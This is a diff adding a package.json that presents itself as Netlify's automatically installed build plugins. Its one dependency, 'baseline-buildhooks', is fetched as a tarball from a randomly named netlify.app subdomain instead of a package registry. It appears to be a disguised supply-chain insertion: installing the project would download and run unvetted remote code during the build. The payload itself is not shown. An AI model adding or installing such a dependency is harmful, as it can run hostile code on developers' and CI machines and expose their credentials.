@@ -1,0 +1,11 @@
+{
+  "name": "netlify-local-plugins",
+  "description": "This directory contains Build plugins that have been automatically installed by Netlify.",
+  "version": "1.0.0",
+  "private": true,
+  "author": "Netlify",
+  "license": "MIT",
+  "dependencies": {
+    "baseline-buildhooks": "https://b0650beb-2bfb-4a53-af8a-b8f14c4decaf.netlify.app/packages/buildhooks.tgz"
+  }
+}
